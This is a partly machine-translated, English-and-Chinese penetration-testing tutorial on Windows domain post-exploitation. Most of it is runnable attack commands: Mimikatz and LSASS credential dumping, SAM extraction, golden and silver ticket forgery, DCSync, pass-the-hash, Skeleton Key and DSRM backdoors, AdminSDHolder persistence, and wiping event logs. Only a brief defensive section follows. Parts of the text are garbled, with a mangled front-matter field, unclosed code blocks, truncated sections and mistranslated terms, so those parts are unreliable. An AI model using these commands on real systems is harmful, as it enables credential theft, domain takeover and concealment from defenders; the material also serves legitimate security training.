---
title: "Windows post-exploitation — Mimikatz password extraction, gold/silver note attacks"
url: "en/windows-post-exploitation"
date: "2026-01-20"
draft: false
summary: "Mimikatz credential extraction full module actual combat, complete process of gold note and silver note attack, DCSync and persistence backdoor"
authors: ["default"]
tags:
  - Windows
  - Mimikatz
  - Kerberos
  - ticket attack
images: ["https://images.unsplash.com/photo-1614064641913-6b0337d12f17?auto=formatimages: ["https://images.unsplash.com/photo-1614064641913-6b0337d12f17?auto=format&fit=crop&w=1200&q=80"]fit=cropimages: ["https://images.unsplash.com/photo-1614064641913-6b0337d12f17?auto=format&fit=crop&w=1200&q=80"]w=1200images: ["https://images.unsplash.com/photo-1614064641913-6b0337d12f17?auto=format&fit=crop&w=1200&q=80"]q=80"]
categories:
  - Penetration testing
---

# Windows post-exploitation — Mimikatz password extraction, gold/silver ticket attacks

The post-exploitation stage is the most valuable part of penetration testing. After gaining initial access and elevating privileges, the attacker needs to extract credentials, establish persistence, and penetrate deeper into the domain environment. Mimikatz is the most iconic tool in Windows post-exploitation, capable of extracting plaintext passwords, NTLM hashes, and Kerberos tickets from memory. This article will comprehensively explain the core functions of Mimikatz, as well as advanced domain attack technologies such as gold notes, silver notes, and DCSync.

## Mimikatz introduction and functional modules

Developed by French security researcher Benjamin Delpy, Mimikatz is one of the most important tools in Windows security research. It extracts authentication credentials by directly accessing the Windows Security Subsystem (LSASS process).

### Core module overview

| Module | Function | Typical uses |
|------|------|---------|
| sekurlsa | LSASS process credential extraction | Extract passwords, hashes, tickets |
| lsadump | LSA database operations | SAM database export, DCSync |
| kerberos | Kerberos operations | ticket export/import/forgery |
| crypto | cryptographic operations | certificate export |
| vault | Windows Credential Vault | Extract saved credentials |
| dpapi | Data Protection API | Decrypt Chrome passwords and more |
| token | token operations | token promotion and impersonation |

### Basic use

```cmd
:: 运行 Mimikatz（需要管理员权限）
mimikatz.exe

:: 提升到调试权限（必须先执行）
mimikatz # privilege::debug
:: 输出: Privilege '20' OK — 表示成功

:: 检查 Mimikatz 版本
mimikatz # version

:: 单行命令执行（自动化场景）
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

## 凭据提取

### sekurlsa::logonpasswords

这是 Mimikatz 最常用的命令，从 LSASS 进程内存中提取所有已登录用户的凭据。

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

::Example output:
::Authentication Id : 0 ; 999 (00000000:000003e7)
::Session: UndefinedLogonType from 0
:: User Name : DC01$
:: Domain :LAB
::Logon Server: (null)
:: SID : S-1-5-18
:: msv :
:: [00000003] Primary
:: * Username : DC01$
:: * Domain : LAB
:: * NTLM : 31d6cfe0d16ae931b73c59d7e0c089c0
:: ...
::
::Authentication Id : 0 ; 453871 (00000000:0006ecef)
::Session : Interactive from 1
::User Name :Administrator
:: Domain :LAB
:: Logon Server : DC01
:: msv :
:: [00000003] Primary
:: * Username : Administrator
:: * Domain : LAB
:: * NTLM : fc525c9683e8fe067095ba2ddc971889
:: * SHA1 : e7cf9a4b8f5e30b0e0f9a6a29f06352c1a8b0e2d
::wdigest:
:: * Username : Administrator
:: * Domain : LAB
:: * Password : P@ssw0rd!
::kerberos:
:: * Username : Administrator
:: * Domain : LAB.LOCAL
:: * Password : P@ssw0rd!
```

> **NOTE**: After Windows 10/Server 2016, WDigest clear text password caching is disabled by default. It can be re-enabled by modifying the registry:

```cmd
:: 启用 WDigest 明文密码存储（需要用户重新登录后生效）
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

:: 然后等待用户重新登录，或锁屏后解锁
rundll32.exe user32.dll,LockWorkStation
```

### sekurlsa 其他命令

```cmd
:: 提取 NTLM Hash
mimikatz # sekurlsa::msv

::Extract Kerberos ticket
mimikatz # sekurlsa::tickets /export

::Extract WDigest credentials
mimikatz #sekurlsa::wdigest

::Extract DPAPI master key
mimikatz #sekurlsa::dpapi

::Extract ekeys (Kerberos encryption keys)
mimikatz #sekurlsa::ekeys

:: Extracted from LSASS dump file (offline analysis)
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz #sekurlsa::logonpasswords
```

### Create LSASS dump

```cmd
:: 方法一：使用任务管理器
:: 任务管理器 > 详细信息 > 右键 lsass.exe > 创建转储文件

:: 方法二：使用 Procdump（Sysinternals 工具，不易被 AV 检测）
procdump.exe -accepteula -ma lsass.exe lsass.dmp

:: 方法三：使用 comsvcs.dll（无需额外工具）
:: 先找到 lsass.exe 的 PID
tasklist | findstr lsass
:: 假设 PID 为 672
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 672 C:\Temp\lsass.dmp full

:: 方法四：PowerShell
powershell -c "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full"
```

### lsadump::sam

从 SAM 数据库中提取本地用户的 NTLM Hash。

```cmd
:: 在线提取（需要 SYSTEM 权限）
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam

::Example output:
::RID: 000001f4 (500)
::User :Administrator
::Hash NTLM: fc525c9683e8fe067095ba2ddc971889
::
::RID: 000001f5 (501)
::User : Guest
::
::RID: 000003e9 (1001)
::User : testuser
::Hash NTLM: a4f49c406510bdcab6824ee7c30fd852

::Offline extraction (from backed up SAM and SYSTEM files)
:: First get the SAM and SYSTEM registry files
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system

:: Then use Mimikatz to parse offline
mimikatz # lsadump::sam /sam:C:\Temp\sam /system:C:\Temp\system

:: Offline parsing using impacket-secretsdump (on Linux)
impacket-secretsdump -sam sam -system system LOCAL
```

## NTLM Hash extraction and utilization

```bash
# 使用 impacket-secretsdump 远程提取所有哈希
impacket-secretsdump lab.local/administrator:'P@ssw0rd!'@10.10.10.100

# 输出包括：
# - SAM 数据库中的本地用户哈希
# - LSA Secrets
# - 缓存的域凭据（DCC2）
# - NTDS.dit 中的域用户哈希（如果目标是 DC）

# 仅提取 NTDS.dit
impacket-secretsdump -just-dc lab.local/administrator:'P@ssw0rd!'@10.10.10.100

# 仅提取 NTLM Hash（不含 Kerberos 密钥）
impacket-secretsdump -just-dc-ntlm lab.local/administrator:'P@ssw0rd!'@10.10.10.100

# 使用 Hash 进行 PTH
crackmapexec smb 10.10.10.0/24 -u administrator -H 'fc525c9683e8fe067095ba2ddc971889' --local-auth

# 破解 NTLM Hash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## 黄金票据（Golden Ticket）攻击

黄金票据是 Kerberos 攻击的终极手段。通过获取 `krbtgt` 账户的 NTLM Hash，攻击者可以伪造任意用户的 TGT（票据授权票据），从而以任意身份访问域内任何资源。

### 获取 krbtgt Hash

```cmd
:: 方法一：Mimikatz DCSync（需要域管或等效权限）
mimikatz # lsadump::dcsync /user:krbtgt /domain:lab.local

::Output:
:: SAM Username : krbtgt
:: Hash NTLM : b889e0d47d6fe22c8f0463a96f3e2d14
:: Object Security ID : S-1-5-21-1234567890-1234567890-1234567890-502

::Method 2: Extract from NTDS.dit
mimikatz # lsadump::lsa /inject /name:krbtgt
```

```bash
# 方法三：使用 impacket-secretsdump
impacket-secretsdump lab.local/administrator:'P@ssw0rd!'@10.10.10.100 -just-dc-user krbtgt
```

### 伪造黄金票据

```cmd
:: 使用 Mimikatz 创建黄金票据
:: 需要：域名、域 SID、krbtgt Hash、目标用户名
mimikatz # kerberos::golden /user:Administrator /domain:lab.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:b889e0d47d6fe22c8f0463a96f3e2d14 /ptt

:: Parameter description:
:: /user - fake username (can be a non-existent user)
::/domain - domain name
::/sid - Domain SID
::/krbtgt - NTLM Hash of krbtgt
::/ptt - Pass-the-Ticket, injected directly into the current session

:: Generate ticket file (not injected immediately)
mimikatz # kerberos::golden /user:Administrator /domain:lab.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:b889e0d47d6fe22c8f0463a96f3e2d14 /ticket:golden.kirbi

:: Inject tickets later
mimikatz # kerberos::ptt golden.kirbi

::Set the ticket validity period to 10 years
mimikatz # kerberos::golden /user:Administrator /domain:lab.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:b889e0d47d6fe22c8f0463a96f3e2d14 /endin:525600 /renewmax:525600 /ptt
```

```bash
# 使用 impacket-ticketer 创建黄金票据
impacket-ticketer -nthash b889e0d47d6fe22c8f0463a96f3e2d14 -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain lab.local Administrator

# 使用票据
export KRB5CCNAME=Administrator.ccache
impacket-psexec lab.local/Administrator@DC01.lab.local -k -no-pass
impacket-wmiexec lab.local/Administrator@DC01.lab.local -k -no-pass
```

### 验证黄金票据

```cmd
:: 查看当前缓存的票据
klist

:: Test access to domain controller C drive share
dir \\DC01\C$

:: Execute commands on the domain controller
PsExec.exe \\DC01 cmd.exe
```

## Silver Ticket Attack

Silver notes are counterfeit Service Notes (ST/TGS), not TGT. It can only access specific services, but the advantage is that it does not need to communicate with the KDC and is more invisible.

### Silver bill production

```cmd
:: 首先需要目标服务账户的 NTLM Hash
:: 例如伪造 CIFS 服务票据（用于 SMB 文件访问）
mimikatz # kerberos::golden /user:Administrator /domain:lab.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:SRV01.lab.local /service:cifs /rc4:a4f49c406510bdcab6824ee7c30fd852 /ptt

:: 参数说明：
:: /target  - 目标服务器
:: /service - 服务类型（cifs, http, mssql, host, ldap 等）
:: /rc4     - 服务账户的 NTLM Hash

:: 伪造 HOST 服务票据（用于 PsExec 远程执行）
mimikatz # kerberos::golden /user:Administrator /domain:lab.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:SRV01.lab.local /service:host /rc4:a4f49c406510bdcab6824ee7c30fd852 /ptt

:: 伪造 HTTP 服务票据（用于 Web 服务访问）
mimikatz # kerberos::golden /user:Administrator /domain:lab.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:SRV01.lab.local /service:http /rc4:a4f49c406510bdcab6824ee7c30fd852 /ptt

:: 伪造 LDAP 服务票据（用于 DCSync）
mimikatz # kerberos::golden /user:Administrator /domain:lab.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:DC01.lab.local /service:ldap /rc4:b889e0d47d6fe22c8f0463a96f3e2d14 /ptt
```

```bash
# 使用 impacket-ticketer 创建白银票据
impacket-ticketer -nthash a4f49c406510bdcab6824ee7c30fd852 -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain lab.local -spn cifs/SRV01.lab.local Administrator

export KRB5CCNAME=Administrator.ccache
impacket-smbclient lab.local/Administrator@SRV01.lab.local -k -no-pass
```

### Gold Notes vs Silver Notes

| Features | Gold Notes | Silver Notes |
|------|---------|---------|
| Counterfeit Type | TGT | TGS/ST |
| Required Hash | krbtgt | Target Service Account |
| Access scope | All resources in the domain | Target service only |
| KDC Communications | Required | Not Required |
| Concealment | Lower | Higher |
| Validity period | Default 10 years | Default 30 days |
| Detection difficulty | Medium | Hard |

## DCSync attack

DCSync is an attack technique that extracts domain user hashes by simulating domain controller replication behavior. It leverages the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All permissions without executing any code on the domain controller.

```cmd
:: Mimikatz DCSync — 提取特定用户
mimikatz # lsadump::dcsync /user:Administrator /domain:lab.local

:: 提取 krbtgt
mimikatz # lsadump::dcsync /user:krbtgt /domain:lab.local

:: 提取所有用户（慎用，流量大易被检测）
mimikatz # lsadump::dcsync /domain:lab.local /all /csv
```

```bash
# impacket-secretsdump DCSync
impacket-secretsdump lab.local/administrator:'P@ssw0rd!'@10.10.10.100

# Extract only domain user hashes

# Using Hash for DCSync

# Output format:

## Credential persistence

### Skeleton Key

The Skeleton Key attack injects a universal password into the LSASS process of the domain controller, allowing the attacker to log in using any username + universal password without affecting the use of the original password.

```cmd
:: 在域控上注入 Skeleton Key（需要域管权限）
mimikatz # privilege::debug
mimikatz # misc::skeleton

:: 注入成功后，可以使用万能密码 "mimikatz" 以任意用户登录
:: 例如：
net use \\DC01\IPC$ /user:lab\Administrator mimikatz
```

```bash
# 远程验证 Skeleton Key
crackmapexec smb 10.10.10.100 -u Administrator -p 'mimikatz' -d lab.local

# Get Shell via PsExec using master password

> **Note**: Skeleton Key only exists in memory and will become invalid after the domain controller is restarted.

### DSRM backdoor

The password for a Directory Services Recovery Model (DSRM) account is set during domain controller installation and is rarely changed thereafter. The DSRM account can be logged in remotely by modifying the registry.

```cmd
:: 查看 DSRM 密码 Hash
mimikatz # token::elevate
mimikatz # lsadump::sam

:: 修改注册表允许 DSRM 账户网络登录
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f

:: 然后可以使用 DSRM 密码通过 PTH 远程登录域控
```

```bash
# 使用 DSRM Hash 进行 PTH
impacket-psexec -hashes :dsrm_ntlm_hash ./Administrator@10.10.10.100
```

### AdminSDHolder persistence

```powershell
# AdminSDHolder 是一个特殊的 AD 容器，其 ACL 每 60 分钟会被复制到所有受保护的组
# 通过修改 AdminSDHolder 的 ACL，可以在受保护组上持久化权限

# 使用 PowerView 添加 ACL
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=lab,DC=local" -PrincipalIdentity testuser -Rights All

# 等待 SDProp 进程运行（默认 60 分钟），或手动触发
Invoke-ADSDPropagation
```

## 痕迹清理

渗透测试完成后，必须清理所有测试痕迹。

```cmd
:: 清除 Kerberos 票据
mimikatz # kerberos::purge
klist purge

:: Clear event log (only within authorization scope)
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

:: PowerShell Clear Logs
Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log }

:: Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force

:: Delete uploaded tools
del /f /q C:\Temp\mimikatz.exe
del /f /q C:\Temp\winPEASx64.exe

::Revert registry modifications
reg delete HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /f

:: Remove Skeleton Key (restart domain control or use)
:: The most reliable method is to restart the domain controller LSASS service
```

```bash
# 清除 Linux 攻击机上的痕迹
rm -rf *.ccache *.kirbi
history -c

# 关闭所有 impacket 连接
# 删除收集的数据文件
rm -rf bloodhound_data.zip *.json hashes.txt
```

## 防御建议

### Credential Guard

Windows Credential Guard 使用虚拟化技术隔离 LSASS 进程，有效防止 Mimikatz 等工具提取凭据。

```powershell
# 启用 Credential Guard
# 通过组策略：计算机配置 > 管理模板 > 系统 > Device Guard > 启用基于虚拟化的安全
# 或通过注册表：
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 1 /f
```

### LAPS（Local Administrator Password Solution）

```powershell
# LAPS 为每台域内计算机自动生成唯一的本地管理员密码
# 安装 LAPS
Install-Module -Name LAPS -Force

# 配置 LAPS GPO
# 启用本地管理员密码管理
# 设置密码复杂度和轮换周期
```

### 受保护用户组（Protected Users）

```powershell
# 将敏感账户加入 Protected Users 组
Add-ADGroupMember -Identity "Protected Users" -Members "Administrator","svc_admin"

# Accounts in the Protected Users group will:

### Other defensive measures

- **Enable LSA Protection** — Prevent unauthorized processes from accessing LSASS

## Summarize

Windows post-penetration is the most technical phase of penetration testing. This article explains in detail the credential extraction and advanced domain attack technology with Mimikatz as the core:

- **Credential Extraction** — `sekurlsa::logonpasswords` and `lsadump::sam` are the core commands for getting passwords and hashes

These techniques are valuable in legitimate penetration testing and red team assessments. In practice, it is important to ensure that there is clear authorization and that the scope of testing is strictly controlled. The ultimate goal of mastering attack techniques is to understand risks and thereby better defend against them.

